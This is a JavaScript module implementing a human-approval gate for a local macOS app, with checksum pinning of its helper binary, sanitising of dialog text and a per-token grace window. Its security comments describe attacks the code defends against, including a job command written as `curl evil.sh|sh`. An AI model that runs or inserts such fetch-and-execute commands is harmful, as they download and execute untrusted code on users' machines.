// Layer 2 of docs/specs/2026-07-26-local-api-auth-design.md: proof that a human
// is present before a high-power action runs.
//
// Why a separate binary at all: Node cannot call LocalAuthentication, so the only
// way to raise the system sheet is to spawn a native executable and read its exit
// code. Everything interesting about this module is therefore a decision about
// how to read an exit code safely, and about how NOT to ask twice.
import { spawn } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { EventEmitter } from 'node:events';
import { createHash } from 'node:crypto';

// 180s, not the 120s first written: the measured password approval consumed 67.6s
// without the user opening a password manager. A bound is still required — a
// background agent must never hang forever on a dialog nobody is looking at.
export const DEFAULT_TIMEOUT_MS = 180_000;
// 5 minutes, job create/edit/enable only. Callers opt in per request; see request().
export const DEFAULT_GRACE_MS = 300_000;
// One dialog open plus this many waiting. Bounded because the alternative to
// "refuse the fourth" is a client that hammers Submit holding four HTTP requests
// open for three minutes each.
export const DEFAULT_MAX_QUEUED = 2;

// LAError.userCancel — measured: deny → exit 1 with `errorCode: -2` on stdout.
const LA_USER_CANCEL = -2;

// Captured at module load, which is BEFORE any extension's init() runs (server.js
// imports this at the top; extensions are loaded inside main()). Read lazily
// instead, an extension — an unsigned local .js file loaded in-process — could do
// `Object.defineProperty(process, 'platform', { value: 'linux' })` and put the
// whole layer into the documented fail-OPEN degraded path.
const BOOT_PLATFORM = process.platform;

// The compiled helper's expected SHA-256, written by install.sh beside the binary.
// Verified before every spawn, not just at boot: `available()` used to be
// `existsSync` and nothing else, so an attacker could replace the binary with one
// that exits 0 and every gated action would be approved silently, forever. swiftc
// signs a replacement just as validly, so the adhoc signature does not help here —
// it detects patching a signed binary, not substituting a fresh one.
//
// This does not make the gate unbypassable by same-user code: whoever can
// overwrite the binary can usually overwrite the pin beside it. What it buys is
// that tampering becomes LOUD and takes two coordinated writes instead of one
// silent one, and a partial attempt fails closed rather than approving everything.
const PIN_SUFFIX = '.sha256';
function helperPinProblem(helperPath) {
  const pinPath = `${helperPath}${PIN_SUFFIX}`;
  let expected;
  try {
    expected = readFileSync(pinPath, 'utf8').trim().split(/\s+/)[0];
  } catch {
    // No pin recorded (an older install). Absence is not evidence of tampering,
    // so this stays permissive — but say so, because it is a weaker posture.
    return { ok: true, unpinned: true };
  }
  if (!/^[0-9a-f]{64}$/i.test(expected)) return { ok: false, reason: `unreadable pin at ${pinPath}` };
  let actual;
  try {
    actual = createHash('sha256').update(readFileSync(helperPath)).digest('hex');
  } catch (err) {
    return { ok: false, reason: `cannot read the helper: ${err?.message ?? err}` };
  }
  if (actual !== expected.toLowerCase()) {
    return { ok: false, reason: `the approval helper does not match its recorded checksum — it has been replaced or rebuilt. Re-run install.sh if you rebuilt it deliberately.` };
  }
  return { ok: true };
}

// The complete vocabulary. public/auth.js's FAILURE_COPY has wording for exactly
// these; a fifth invented here would reach the user as a bare code.
export const APPROVAL_CODES = [
  'approval_denied',
  'approval_timeout',
  'approval_unavailable',
  'approval_busy',
];

// macOS prepends "<helper filename> is trying to " to whatever we pass, so
// `detail` IS the rest of that sentence and is handed over untouched. `action` is
// a machine key (`job.create`, `cleanup`) for the audit line and is never shown —
// splicing it into the dialog would put `job.create` in front of the user.
// The system sheet is the ONLY thing telling the user what they are approving,
// and `detail` embeds text whose shape they do not control (a job name has no
// character or length restriction anywhere in validate.js). Left raw, a name
// containing newlines renders extra lines INSIDE the sheet. Measured: a name
// could make it read "This is a routine macOS security update. Touch ID to
// continue." above the real sentence, so the user would approve a job whose
// command was `curl evil.sh|sh` believing it was an OS update. That makes this a
// spoofing bug, not a cosmetic one.
//
// The sentence is therefore flattened to a single line before it can reach the
// dialog:
//   * every control character and Unicode line/paragraph separator becomes a
//     space -- this is what kills the injected-lines attack;
//   * bidi overrides and isolates are removed, since they visually reorder the
//     sentence without changing any of its characters;
//   * whitespace runs collapse, so padding cannot push the real text out of view;
//   * length is capped, because the sheet is small and an over-long reason is
//     truncated by the OS at an unpredictable point. Truncating deliberately
//     keeps the head, which carries the verb and the object being approved.
//
// Note it flattens rather than censors: the injected words still appear, on one
// line, inside the quoted job name where they belong. Removing them would be its
// own kind of lie about what is being created.
const DIALOG_MAX = 160;

export function flattenReason(text) {
  return String(text ?? '')
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/g, ' ')
    .replace(/[\u200e\u200f\u202a-\u202e\u2066-\u2069]/g, '')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, DIALOG_MAX)
    .trim();
}

function reasonFor({ action, detail }) {
  const sentence = flattenReason(detail);
  if (sentence) return sentence;
  // A caller that forgot the sentence still gets a truthful, if blunt, dialog
  // rather than an empty one that reads "LaunchBox is trying to .".
  const key = typeof action === 'string' && action.trim() ? action.trim() : 'an unnamed action';
  return `perform “${key}”, which can change what runs on this Mac`;
}

// The helper prints one JSON object; anything else on stdout is ignored rather
// than treated as an error, so a future diagnostic line cannot break the parse.
function errorCodeFrom(stdout) {
  for (const line of String(stdout).split('\n')) {
    if (!line.trim().startsWith('{')) continue;
    try {
      const obj = JSON.parse(line);
      if (typeof obj?.errorCode === 'number') return obj.errorCode;
    } catch { /* not our line */ }
  }
  return null;
}

// One dialog. Resolves — never rejects — because every outcome here is a decision
// the caller has to render, not an exception it can do anything with.
function runHelper({ spawnFn, helperPath, reason, timeoutMs }) {
  return new Promise((resolve) => {
    let child;
    try {
      child = spawnFn(helperPath, ['--auth', reason], { stdio: ['ignore', 'pipe', 'pipe'] });
    } catch (err) {
      resolve({ ok: false, code: 'approval_unavailable', message: `the approval helper would not start: ${err?.message ?? err}` });
      return;
    }

    let out = '';
    let errOut = '';
    let done = false;
    const settle = (result) => {
      if (done) return;
      done = true;
      clearTimeout(watchdog);
      resolve(result);
    };

    // Settle first, then kill — exactly as lib/usage.js does. The kill makes the
    // child close non-zero, and a `close` handler that could still win the race
    // would rewrite a timeout as a tamper report.
    const watchdog = setTimeout(() => {
      settle({ ok: false, code: 'approval_timeout' });
      // SIGKILL because the sheet must not outlive the request that raised it: an
      // approval collected ten minutes later would be granting an action the
      // caller has already been told was refused.
      try { child.kill('SIGKILL'); } catch { /* already gone */ }
    }, timeoutMs);
    watchdog.unref?.();

    child.stdout?.on('data', (d) => { out += d; });
    child.stderr?.on('data', (d) => { errOut += d; });
    child.on('error', (err) => settle({
      ok: false, code: 'approval_unavailable', message: `the approval helper would not start: ${err?.message ?? err}`,
    }));
    child.on('close', (code, signal) => {
      if (code === 0) return settle({ ok: true });
      // swiftc's adhoc signature is mandatory on Apple Silicon: a stripped or
      // patched helper is SIGKILLed by the kernel, which makes 137 a free tamper
      // detector. It is emphatically not a denial.
      if (code === 137 || signal === 'SIGKILL') {
        return settle({
          ok: false,
          code: 'approval_unavailable',
          tampered: true,
          message: 'the approval helper was killed on launch, which means the binary has been tampered with — reinstall to rebuild it',
        });
      }
      const errorCode = errorCodeFrom(out);
      if (errorCode === LA_USER_CANCEL) return settle({ ok: false, code: 'approval_denied', errorCode });
      // Fails closed as *unavailable*, not denied, for every other errorCode
      // (-1 authenticationFailed, -8 biometryLockout, a code Apple adds next
      // year): "we could not establish that a human approved" is not the same
      // claim as "the human said no", and only the first is honest here. The raw
      // code rides along so the log says which it was.
      return settle({
        ok: false,
        code: 'approval_unavailable',
        errorCode,
        message: `the approval helper exited ${code}${errorCode === null ? '' : ` with errorCode ${errorCode}`}${errOut.trim() ? `: ${errOut.trim().split('\n').at(-1)}` : ''}`,
      });
    });
  });
}

/**
 * Serialised, grace-aware approval gate.
 *
 * `request({ action, detail, token, grace })`:
 *   - `detail` completes the sentence "<helper filename> is trying to …"
 *   - `token` is the caller's capability token; grace is bound to it
 *   - `grace: true` opts this action into the 5-minute window. Destructive
 *     actions simply do not pass it, which is why the policy lives at the call
 *     site rather than in a list here.
 *
 * Resolves `{ ok: true }`, `{ ok: true, graced: true }`, `{ ok: true, degraded: true }`,
 * or `{ ok: false, code }` with `code` from APPROVAL_CODES. Never rejects.
 */
export function createApproval({
  spawnFn = spawn,
  helperPath,
  now = () => Date.now(),
  timeoutMs = DEFAULT_TIMEOUT_MS,
  graceMs = DEFAULT_GRACE_MS,
  platform = BOOT_PLATFORM,
  maxQueued = DEFAULT_MAX_QUEUED,
} = {}) {
  const events = new EventEmitter();
  // An unheard 'error' event throws rather than being dropped, which would turn a
  // handled failure back into a crash. Same trap lib/sessions.js already hit.
  events.on('error', () => {});
  // token → ms deadline. Same secret this process already holds to answer
  // requests, so keeping it in memory adds no exposure; it is never emitted.
  const graceUntil = new Map();
  const queue = [];
  let inFlight = false;

  // Sync on purpose: server.js needs this while building a response, and the two
  // things it reports (platform support, helper present) are both cheap.
  //
  // `ok` means an approval can actually be enforced. `degraded` distinguishes the
  // one failure that fails OPEN (unsupported platform) from the one that fails
  // closed (helper missing), so a caller cannot conflate them.
  function available() {
    if (platform !== 'darwin') {
      return {
        ok: false,
        degraded: true,
        platform,
        helperPath: helperPath ?? null,
        reason: `approvals are not implemented on ${platform} yet — gated actions run without one`,
      };
    }
    if (!helperPath || !existsSync(helperPath)) {
      return {
        ok: false,
        degraded: false,
        platform,
        helperPath: helperPath ?? null,
        reason: 'the approval helper is not installed, so gated actions are refused — reinstall to rebuild it',
      };
    }
    // Checked here AND before every spawn: a boot-time check only proves the
    // binary was honest once.
    const pin = helperPinProblem(helperPath);
    if (!pin.ok) {
      return { ok: false, degraded: false, platform, helperPath, tampered: true, reason: pin.reason };
    }
    return { ok: true, degraded: false, platform, helperPath, unpinned: pin.unpinned === true, reason: null };
  }

  // Only a non-empty string token can be bound to. No token means no grace: an
  // unbound window is one any caller could ride, which is the thing grace being
  // per-token exists to prevent.
  const graceKey = (token) => (typeof token === 'string' && token ? token : null);

  function graceHolds(token) {
    const key = graceKey(token);
    if (!key) return false;
    const until = graceUntil.get(key);
    if (until === undefined) return false;
    if (until <= now()) {
      graceUntil.delete(key);
      return false;
    }
    return true;
  }

  function grantGrace(token) {
    const key = graceKey(token);
    if (!key) return;
    // Fixed from this approval, never slid forward by a request the window itself
    // waved through: a sliding window could be held open indefinitely by editing
    // a job every four minutes, and a grace window is an attack window.
    graceUntil.set(key, now() + graceMs);
    for (const [k, until] of graceUntil) if (until <= now()) graceUntil.delete(k);
  }

  // One dialog at a time. Stacked system sheets are how people approve the wrong
  // thing, so later requests wait their turn instead.
  async function pump() {
    if (inFlight) return;
    inFlight = true;
    try {
      while (queue.length) {
        const job = queue.shift();
        // A job that throws must not take the whole layer down with it. Without
        // this catch, one throwing event listener would unwind out of the loop and
        // leave `inFlight` true forever: pump() would early-return from then on,
        // every queued request would hang, and everything past maxQueued would get
        // approval_busy permanently. That is the wrong shape for the variable
        // deciding whether anyone can ever be prompted again.
        try {
          await job(); // eslint-disable-line no-await-in-loop -- serialising is the point
        } catch (err) {
          events.emit('error', err);
        }
      }
    } finally {
      inFlight = false;
    }
  }

  async function request({ action, detail, token, grace = false } = {}) {
    const startedAt = now();
    // Never carries the token or any hint of which factor the user used:
    // LocalAuthentication does not report the factor, and an audit line claiming
    // "approved by fingerprint" would assert more than the mechanism supports.
    const finish = (result, name, message = result.message) => {
      events.emit('approval', {
        at: new Date(startedAt).toISOString(),
        action: action ?? null,
        result: name,
        code: result.code ?? null,
        ms: now() - startedAt,
        ...(result.errorCode == null ? {} : { errorCode: result.errorCode }),
        ...(message ? { message } : {}),
      });
      return result;
    };

    const state = available();

    // The one deliberate fail-open, on the user's explicit call that macOS-only
    // is acceptable for now. Announced, not silent — the result says `degraded`,
    // the event carries the sentence, and `available().reason` is what the UI
    // notice reads. Kept out of the result itself so callers cannot start
    // rendering it as if it were an error.
    if (state.degraded) return finish({ ok: true, degraded: true }, 'degraded', state.reason);

    // Checked before grace: an attacker who can delete the helper must not get a
    // free pass just because a window happens to be open.
    if (!state.ok) return finish({ ok: false, code: 'approval_unavailable', message: state.reason }, 'unavailable');

    // `=== true`, not truthy: a stray string from a request body must not be able
    // to opt an action into the grace window.
    const eligible = grace === true;
    if (eligible && graceHolds(token)) return finish({ ok: true, graced: true }, 'graced');

    if (inFlight && queue.length >= maxQueued) {
      // Refused immediately rather than queued behind a three-minute dialog, so
      // the client gets a 409 it can explain instead of a request that hangs.
      return finish({ ok: false, code: 'approval_busy' }, 'busy');
    }

    const reason = reasonFor({ action, detail });
    const settled = new Promise((resolve) => {
      queue.push(async () => {
        // ⚠️ There is deliberately NO grace re-check here. Removing the one that
        // used to be is a security fix, not a simplification.
        //
        // It re-checked graceHolds(token) on reaching the front of the queue, on the
        // reasoning that the approval this request waited behind might have been for
        // "the same action". But the grace key is the capability token, and there is
        // exactly one token for the whole app — so every caller able to reach this
        // code is the same grace principal, including the ones the threat model
        // names: a browser extension reading localStorage, a container port-forward,
        // an `ssh -R`.
        //
        // That made this possible: an attacker fires a gated request and takes the
        // dialog; the user's own request queues behind it; the user approves what
        // they believe is their own action; the attacker's grace then waves the
        // user's queued request through with no dialog. One fingerprint, two
        // actions, and the UI shows exactly what the user expected.
        //
        // Whoever reaches the front of the queue must earn its own approval. Grace is
        // still honoured at ENTRY, which serves the case it exists for — a human
        // editing several jobs in a row, whose requests are sequential and so never
        // queue behind one another.
        events.emit('prompt', { at: new Date(now()).toISOString(), action: action ?? null, reason });
        // Re-verified at spawn time, not just at boot: the window between the two
        // is exactly when a substitution would land.
        const pin = helperPinProblem(helperPath);
        if (!pin.ok) {
          resolve(finish({ ok: false, code: 'approval_unavailable', message: pin.reason }, 'unavailable', pin.reason));
          return;
        }
        const result = await runHelper({ spawnFn, helperPath, reason, timeoutMs });
        if (result.ok && eligible) grantGrace(token);
        resolve(finish(result, result.ok ? 'approved' : result.code.replace('approval_', '')));
      });
    });
    pump();
    return settled;
  }

  return { request, available, events };
}
